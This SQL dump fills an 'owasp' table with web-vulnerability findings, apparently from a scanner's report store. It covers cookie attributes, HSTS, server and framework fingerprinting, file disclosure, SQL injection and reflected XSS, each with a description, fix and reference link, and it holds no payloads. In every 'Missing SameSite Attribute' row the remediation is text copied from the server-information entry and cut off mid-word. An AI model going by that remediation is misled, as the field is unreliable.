(478, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 116, 'Low'),
(479, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 116, 'Low'),
(480, 'Web Server Infomation Leakage through Server header', 'Accurately discovering the type of web server that an application runs on can enable security testers to determine if the application is vulnerable to attack. In particular, servers running older versions of software without up-to-date security patches can be susceptible to known version-specific exploits.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific server vulnerabilities that can be used to exploit unpatched servers. For this reason it is recommended that some precautions be taken. These actions include:\n\nObscuring web server information in headers, such as with Apache’s mod_headers module.\nUsing a hardened reverse proxy server to create an additional layer of security between the web server and the Internet.\nEnsuring that web servers are kept up-to-date with the latest software and security patches.', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server', NULL, 'WSTG-INFO-02', 116, 'Low'),
(481, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 116, 'Low'),
(487, 'Sensitive File Disclosure', 'Sensitive file leak due to Security Misconfiguration', 'Configure your web server to prevent public access to the private information by implementing access control mechanisms', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission', NULL, 'WSTG-CONF-09', 118, 'Medium'),
(488, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 118, 'Low'),
(489, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 118, 'Low');
INSERT INTO `owasp` (`OID`, `Vul_name`, `Vul_des`, `vul_sol`, `vul_ref`, `payloadlist`, `OType`, `PID`, `Severity`) VALUES
(490, 'Web Server Infomation Leakage through Server header', 'Accurately discovering the type of web server that an application runs on can enable security testers to determine if the application is vulnerable to attack. In particular, servers running older versions of software without up-to-date security patches can be susceptible to known version-specific exploits.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific server vulnerabilities that can be used to exploit unpatched servers. For this reason it is recommended that some precautions be taken. These actions include:\n\nObscuring web server information in headers, such as with Apache’s mod_headers module.\nUsing a hardened reverse proxy server to create an additional layer of security between the web server and the Internet.\nEnsuring that web servers are kept up-to-date with the latest software and security patches.', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server', NULL, 'WSTG-INFO-02', 118, 'Low'),
(491, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 118, 'Low'),
(492, 'Web Application Framework Infomation Leakage', 'There is nothing new under the sun, and nearly every web application that one may think of developing has already been developed. With the vast number of free and Open Source software projects that are actively developed and deployed around the world, it is very likely that an application security test will face a target that is entirely or partly dependent on these well known applications or frameworks (e.g. WordPress, phpBB, Mediawiki, etc). Knowing the web application components that are being tested significantly helps in the testing process and will also drastically reduce the effort required during the test. These well known web applications have known HTML headers, cookies, and directory structures that can be enumerated to identify the application. Most of the web frameworks have several markers in those locations which help an attacker or tester to recognize them. This is basically what all automatic tools do, they look for a marker from a predefined location and then compare it to the database of known signatures. For better accuracy several markers are usually used.', 'While efforts can be made to use different cookie names (through changing configs), hiding or changing file/directory paths (through rewriting or source code changes), removing known headers, etc. such efforts boil down to “security through obscurity”. System owners/admins should recognize that those efforts only slow down the most basic of adversaries. The time/effort may be better used on stakeholder awareness and solution maintenance activities.', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework', NULL, 'WSTG-INFO-08', 118, 'Low'),
(493, 'SQL Injection', 'SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.\n\nA wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server.', 'The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize every variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.\n\nYou should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective:\n\nOne common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.\nAnother often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.', 'https://portswigger.net/kb/issues/00100200_sql-injection', NULL, 'WSTG-INPV-05', 119, 'High'),
(494, 'Reflected Cross Site Scriptng', 'Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application\'s immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user\'s browser in the context of that user\'s session with the application.\n\nThe attacker-supplied code can perform a wide variety of actions, such as stealing the victim\'s session token or login credentials, performing arbitrary actions on the victim\'s behalf, and logging their keystrokes.\n\nUsers can be induced to issue the attacker\'s crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).', 'In most situations where user-controllable data is copied into application responses, cross-site scripting attacks can be prevented using two layers of defenses:\n\nInput should be validated as strictly as possible on arrival, given the kind of content that it is expected to contain. For example, personal names should consist of alphabetical and a small range of typographical characters, and be relatively short; a year of birth should consist of exactly four numerals; email addresses should match a well-defined regular expression. Input which fails the validation should be rejected, not sanitized.\nUser input should be HTML-encoded at any point where it is copied into application responses. All HTML metacharacters, including < > \" \' and =, should be replaced with the corresponding HTML entities (&lt; &gt; etc).\nIn cases where the application\'s functionality allows users to author content using a restricted subset of HTML tags and attributes (for example, blog comments which allow limited formatting and linking), it is necessary to parse the supplied HTML to validate that it does not use any dangerous syntax; this is a non-trivial task.', 'https://portswigger.net/kb/issues/00200300_cross-site-scripting-reflected', NULL, 'WSTG-INPV-01', 119, 'High'),
(495, 'Sensitive File Disclosure', 'Sensitive file leak due to Security Misconfiguration', 'Configure your web server to prevent public access to the private information by implementing access control mechanisms', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission', NULL, 'WSTG-CONF-09', 119, 'Medium'),
(496, 'Missing Expires Attribute in Cookie Header', 'The Expires attribute is used to:\n- set persistent cookies\n- limit lifespan if a session lives for too long\n- remove a cookie forcefully by setting it to a past date\n- Unlike session cookies, persistent cookies will be used by the browser until the cookie expires. Once the expiration date has exceeded the time set, the browser will delete the cookie.', 'Implement Expires Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 119, 'Low'),
(497, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 119, 'Low'),
(498, 'Sensitive File Disclosure', 'Sensitive file leak due to Security Misconfiguration', 'Configure your web server to prevent public access to the private information by implementing access control mechanisms', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission', NULL, 'WSTG-CONF-09', 120, 'Medium'),
(499, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 120, 'Low'),
(500, 'Web Application Framework Infomation Leakage', 'There is nothing new under the sun, and nearly every web application that one may think of developing has already been developed. With the vast number of free and Open Source software projects that are actively developed and deployed around the world, it is very likely that an application security test will face a target that is entirely or partly dependent on these well known applications or frameworks (e.g. WordPress, phpBB, Mediawiki, etc). Knowing the web application components that are being tested significantly helps in the testing process and will also drastically reduce the effort required during the test. These well known web applications have known HTML headers, cookies, and directory structures that can be enumerated to identify the application. Most of the web frameworks have several markers in those locations which help an attacker or tester to recognize them. This is basically what all automatic tools do, they look for a marker from a predefined location and then compare it to the database of known signatures. For better accuracy several markers are usually used.', 'While efforts can be made to use different cookie names (through changing configs), hiding or changing file/directory paths (through rewriting or source code changes), removing known headers, etc. such efforts boil down to “security through obscurity”. System owners/admins should recognize that those efforts only slow down the most basic of adversaries. The time/effort may be better used on stakeholder awareness and solution maintenance activities.', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework', NULL, 'WSTG-INFO-08', 120, 'Low'),
(501, 'Missing HttpOnly Attribute in Cookie Header', 'The HttpOnly attribute is used to help prevent attacks such as session leakage, since it does not allow the cookie to be accessed via a client-side script such as JavaScript.', 'Implement HttpOnly Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 121, 'Low'),
(502, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 121, 'Low'),
(514, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 123, 'Low'),
(515, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 122, 'Low'),
(521, 'Sensitive File Disclosure', 'Sensitive file leak due to Security Misconfiguration', 'Configure your web server to prevent public access to the private information by implementing access control mechanisms', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission', NULL, 'WSTG-CONF-09', 117, 'Medium'),
(522, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 117, 'Low'),
(523, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 117, 'Low'),
(524, 'Web Server Infomation Leakage through Server header', 'Accurately discovering the type of web server that an application runs on can enable security testers to determine if the application is vulnerable to attack. In particular, servers running older versions of software without up-to-date security patches can be susceptible to known version-specific exploits.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific server vulnerabilities that can be used to exploit unpatched servers. For this reason it is recommended that some precautions be taken. These actions include:\n\nObscuring web server information in headers, such as with Apache’s mod_headers module.\nUsing a hardened reverse proxy server to create an additional layer of security between the web server and the Internet.\nEnsuring that web servers are kept up-to-date with the latest software and security patches.', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server', NULL, 'WSTG-INFO-02', 117, 'Low'),
(525, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 117, 'Low'),
(526, 'Web Application Framework Infomation Leakage', 'There is nothing new under the sun, and nearly every web application that one may think of developing has already been developed. With the vast number of free and Open Source software projects that are actively developed and deployed around the world, it is very likely that an application security test will face a target that is entirely or partly dependent on these well known applications or frameworks (e.g. WordPress, phpBB, Mediawiki, etc). Knowing the web application components that are being tested significantly helps in the testing process and will also drastically reduce the effort required during the test. These well known web applications have known HTML headers, cookies, and directory structures that can be enumerated to identify the application. Most of the web frameworks have several markers in those locations which help an attacker or tester to recognize them. This is basically what all automatic tools do, they look for a marker from a predefined location and then compare it to the database of known signatures. For better accuracy several markers are usually used.', 'While efforts can be made to use different cookie names (through changing configs), hiding or changing file/directory paths (through rewriting or source code changes), removing known headers, etc. such efforts boil down to “security through obscurity”. System owners/admins should recognize that those efforts only slow down the most basic of adversaries. The time/effort may be better used on stakeholder awareness and solution maintenance activities.', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework', NULL, 'WSTG-INFO-08', 117, 'Low'),
(527, 'Sensitive File Disclosure', 'Sensitive file leak due to Security Misconfiguration', 'Configure your web server to prevent public access to the private information by implementing access control mechanisms', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission', NULL, 'WSTG-CONF-09', 108, 'Medium'),
(528, 'Missing Expires Attribute in Cookie Header', 'The Expires attribute is used to:\n- set persistent cookies\n- limit lifespan if a session lives for too long\n- remove a cookie forcefully by setting it to a past date\n- Unlike session cookies, persistent cookies will be used by the browser until the cookie expires. Once the expiration date has exceeded the time set, the browser will delete the cookie.', 'Implement Expires Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 108, 'Low'),
(529, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 108, 'Low'),
(530, 'Web Server Infomation Leakage through Server header', 'Accurately discovering the type of web server that an application runs on can enable security testers to determine if the application is vulnerable to attack. In particular, servers running older versions of software without up-to-date security patches can be susceptible to known version-specific exploits.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific server vulnerabilities that can be used to exploit unpatched servers. For this reason it is recommended that some precautions be taken. These actions include:\n\nObscuring web server information in headers, such as with Apache’s mod_headers module.\nUsing a hardened reverse proxy server to create an additional layer of security between the web server and the Internet.\nEnsuring that web servers are kept up-to-date with the latest software and security patches.', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server', NULL, 'WSTG-INFO-02', 108, 'Low'),
(531, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 108, 'Low'),
(532, 'Sensitive File Disclosure', 'Sensitive file leak due to Security Misconfiguration', 'Configure your web server to prevent public access to the private information by implementing access control mechanisms', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission', NULL, 'WSTG-CONF-09', 124, 'Medium'),
(533, 'Missing Expires Attribute in Cookie Header', 'The Expires attribute is used to:\n- set persistent cookies\n- limit lifespan if a session lives for too long\n- remove a cookie forcefully by setting it to a past date\n- Unlike session cookies, persistent cookies will be used by the browser until the cookie expires. Once the expiration date has exceeded the time set, the browser will delete the cookie.', 'Implement Expires Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 124, 'Low'),
(534, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 124, 'Low'),
(535, 'Web Server Infomation Leakage through Server header', 'Accurately discovering the type of web server that an application runs on can enable security testers to determine if the application is vulnerable to attack. In particular, servers running older versions of software without up-to-date security patches can be susceptible to known version-specific exploits.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific server vulnerabilities that can be used to exploit unpatched servers. For this reason it is recommended that some precautions be taken. These actions include:\n\nObscuring web server information in headers, such as with Apache’s mod_headers module.\nUsing a hardened reverse proxy server to create an additional layer of security between the web server and the Internet.\nEnsuring that web servers are kept up-to-date with the latest software and security patches.', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server', NULL, 'WSTG-INFO-02', 124, 'Low'),
(536, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 124, 'Low'),
(537, 'Sensitive File Disclosure', 'Sensitive file leak due to Security Misconfiguration', 'Configure your web server to prevent public access to the private information by implementing access control mechanisms', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission', NULL, 'WSTG-CONF-09', 125, 'Medium'),
(538, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 125, 'Low'),
(539, 'Missing Expires Attribute in Cookie Header', 'The Expires attribute is used to:\n- set persistent cookies\n- limit lifespan if a session lives for too long\n- remove a cookie forcefully by setting it to a past date\n- Unlike session cookies, persistent cookies will be used by the browser until the cookie expires. Once the expiration date has exceeded the time set, the browser will delete the cookie.', 'Implement Expires Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 125, 'Low'),
(540, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 125, 'Low'),
(541, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 125, 'Low'),
(542, 'Sensitive File Disclosure', 'Sensitive file leak due to Security Misconfiguration', 'Configure your web server to prevent public access to the private information by implementing access control mechanisms', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission', NULL, 'WSTG-CONF-09', 127, 'Medium'),
(543, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 127, 'Low'),
(544, 'Missing HttpOnly Attribute in Cookie Header', 'The HttpOnly attribute is used to help prevent attacks such as session leakage, since it does not allow the cookie to be accessed via a client-side script such as JavaScript.', 'Implement HttpOnly Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 127, 'Low'),
